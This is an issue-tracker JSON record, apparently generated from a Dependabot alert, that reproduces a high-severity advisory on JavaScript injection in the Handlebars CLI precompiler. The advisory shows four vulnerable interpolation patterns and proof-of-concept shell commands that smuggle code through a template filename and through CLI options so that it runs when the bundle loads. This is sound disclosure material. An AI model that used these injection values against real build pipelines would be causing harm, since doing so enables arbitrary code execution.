@@ -1,0 +1,32 @@
+{
+  "id": "blbs-38d11d91-c956-45e4-ac47-c6c5263b6bfd",
+  "title": "[Dependabot] GHSA-xjpj-3mr7-gcpf in handlebars",
+  "description": "## Handlebars.js has JavaScript Injection in CLI Precompiler via Unescaped Names and Options\n\n**Provider:** GitHub Dependabot\n**Repository:** `AnthusAI/Biblicus`\n**Alert Number:** 46\n**Severity:** high\n**State:** open\n**Package:** `handlebars`\n**Ecosystem:** `npm`\n**Manifest:** `apps/dashboard/package-lock.json`\n\n### Advisory\n## Summary\n\nThe Handlebars CLI precompiler (`bin/handlebars` / `lib/precompiler.js`) concatenates user-controlled strings — template file names and several CLI options — directly into the JavaScript it emits, without any escaping or sanitization. An attacker who can influence template filenames or CLI arguments can inject arbitrary JavaScript that executes when the generated bundle is loaded in Node.js or a browser.\n\n## Description\n\n`lib/precompiler.js` generates JavaScript source by string-interpolating several values directly into the output. Four distinct injection points exist:\n\n### 1. Template name injection\n\n```javascript\n// Vulnerable code pattern\noutput += 'templates[\"' + template.name + '\"] = template(...)';\n```\n\n`template.name` is derived from the file system path. A filename containing `\"` or `'];` breaks out of the string literal and injects arbitrary JavaScript.\n\n### 2. Namespace injection (`-n` / `--namespace`)\n\n```javascript\n// Vulnerable code pattern\noutput += 'var templates = ' + opts.namespace + ' = ' + opts.namespace + ' || {};';\n```\n\n`opts.namespace` is emitted as raw JavaScript. Anything after a `;` in the value becomes an additional JavaScript statement.\n\n### 3. CommonJS path injection (`-c` / `--commonjs`)\n\n```javascript\n// Vulnerable code pattern\noutput += 'var Handlebars = require(\"' + opts.commonjs + '\");';\n```\n\n`opts.commonjs` is interpolated inside double quotes with no escaping, allowing `\"` to close the string and inject further code.\n\n### 4. AMD path injection (`-h` / `--handlebarPath`)\n\n```javascript\n// Vulnerable code pattern\noutput += \"define(['\" + opts.handlebarPath + \"handlebars.runtime'], ...)\";\n```\n\n`opts.handlebarPath` is interpolated inside single quotes, allowing `'` to close the array element.\n\nAll four injection points result in code that executes when the generated bundle is `require()`d or loaded in a browser.\n\n## Proof of Concept\n\n**Template name vector (creates a file `pwned` on disk):**\n\n```bash\nmkdir -p templates\nprintf 'Hello' > \"templates/evil'] = (function(){require(\\\"fs\\\").writeFileSync(\\\"pwned\\\",\\\"1\\\")})(); //.handlebars\"\n\nnode bin/handlebars templates -o out.js\nnode -e 'require(\"./out.js\")'  # Executes injected code, creates ./pwned\n```\n\n**Namespace vector:**\n\n```bash\nnode bin/handlebars templates -o out.js \\\n  -n \"App.ns; require('fs').writeFileSync('pwned2','1'); //\"\nnode -e 'require(\"./out.js\")'\n```\n\n**CommonJS vector:**\n\n```bash\nnode bin/handlebars templates -o out.js \\\n  -c 'handlebars\"); require(\"fs\").writeFileSync(\"pwned3\",\"1\"); //'\nnode -e 'require(\"./out.js\")'\n```\n\n**AMD vector:**\n\n```bash\nnode bin/handlebars templates -o out.js -a \\\n  -h \"'); require('fs').writeFileSync('pwned4','1'); // \"\nnode -e 'require(\"./out.js\")'\n```\n\n## Workarounds\n\n- **Validate all CLI inputs** before invoking the precompiler. Reject filenames and option values  that contain characters with JavaScript string-escaping significance (`\"`, `'`, `;`, etc.).\n- **Use a fixed, trusted namespace string** passed via a configuration file rather than  command-line arguments in automated pipelines.\n- **Run the precompiler in a sandboxed environment** (container with no write access to sensitive  paths) to limit the impact of successful exploitation.\n- **Audit template filenames** in any repository or package that is consumed by an automated  build pipeline.\n\n### Reference\n- https://github.com/AnthusAI/Biblicus/security/dependabot/46",
+  "type": "sub-task",
+  "status": "open",
+  "priority": 1,
+  "assignee": null,
+  "creator": null,
+  "parent": "blbs-9459a52e-c193-44a6-bf57-0ddb13b4d0d3",
+  "labels": [
+    "security",
+    "github",
+    "dependabot"
+  ],
+  "dependencies": [],
+  "comments": [],
+  "created_at": "2026-04-17T19:54:00.947946Z",
+  "updated_at": "2026-04-17T19:54:00.947946Z",
+  "closed_at": null,
+  "custom": {
+    "github_alert_number": 46,
+    "github_alert_state": "open",
+    "github_ecosystem": "npm",
+    "github_html_url": "https://github.com/AnthusAI/Biblicus/security/dependabot/46",
+    "github_manifest_path": "apps/dashboard/package-lock.json",
+    "github_package": "handlebars",
+    "github_provider": "dependabot",
+    "github_repository": "AnthusAI/Biblicus",
+    "github_severity": "high"
+  }
+}
